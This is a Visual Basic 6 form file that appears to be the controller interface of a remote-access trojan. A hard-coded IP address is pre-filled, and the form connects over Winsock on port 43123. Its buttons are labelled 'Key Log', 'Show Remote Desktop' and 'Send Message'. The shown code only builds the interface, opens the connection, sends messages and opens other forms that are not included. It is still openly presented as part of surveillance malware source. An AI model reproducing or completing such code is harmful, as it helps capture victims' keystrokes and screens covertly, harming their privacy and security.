VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form FrmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Main"
   ClientHeight    =   2595
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   4410
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   2595
   ScaleWidth      =   4410
   StartUpPosition =   3  'Windows Default
   Begin MSWinsockLib.Winsock wsckMessage 
      Left            =   3840
      Top             =   720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Frame fraCommands 
      Caption         =   "Commands"
      Enabled         =   0   'False
      Height          =   1455
      Left            =   120
      TabIndex        =   3
      Top             =   1080
      Width           =   4215
      Begin VB.CommandButton cmdKeyLog 
         Caption         =   "&Key Log"
         Height          =   495
         Left            =   2160
         TabIndex        =   7
         Top             =   840
         Width           =   1935
      End
      Begin VB.CommandButton cmdDisconnect 
         Caption         =   "&Disconnect"
         Height          =   495
         Left            =   120
         TabIndex        =   6
         Top             =   840
         Width           =   1935
      End
      Begin VB.CommandButton cmdShowIMG 
         Caption         =   "&Show Remote Desktop"
         Height          =   495
         Left            =   2160
         TabIndex        =   5
         Top             =   240
         Width           =   1935
      End
      Begin VB.CommandButton cmdSendMsg 
         Caption         =   "Send &Message"
         Height          =   495
         Left            =   120
         TabIndex        =   4
         Top             =   240
         Width           =   1935
      End
   End
   Begin VB.Frame fraConnect 
      Caption         =   "Connect"
      Height          =   855
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   4215
      Begin VB.TextBox txtIP 
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   120
         TabIndex        =   2
         Text            =   "68.110.225.124"
         Top             =   240
         Width           =   2655
      End
      Begin VB.CommandButton cmdConnect 
         Caption         =   "&Connect"
         Height          =   375
         Left            =   2880
         TabIndex        =   1
         Top             =   240
         Width           =   1215
      End
   End
End
Attribute VB_Name = "FrmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub cmdConnect_Click()
wsckMessage.Close
wsckMessage.Connect txtIP.Text, 43123
End Sub

Private Sub cmdDisconnect_Click()
wsckMessage.Close
fraCommands.Enabled = False
fraConnect.Enabled = True
End Sub

Private Sub cmdKeyLog_Click()
frmLOG.Show
End Sub

Private Sub cmdSendMsg_Click()
Dim MSG$
MSG = InputBox("Enter a message", App.Title)
If MSG <> "" Then
    wsckMessage.SendData MSG
End If
End Sub

Private Sub cmdShowIMG_Click()
frmImage.Show
End Sub

Private Sub Form_Load()
Me.Left = Screen.Width / 10
Me.Top = Screen.Height / 10
End Sub

Private Sub wsckMessage_Close()
fraCommands.Enabled = False
fraConnect.Enabled = True
End Sub

Private Sub wsckMessage_Connect()
fraConnect.Enabled = False
fraCommands.Enabled = True
End Sub

Private Sub wsckMessage_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
MsgBox Description, vbCritical, App.Title
End Sub
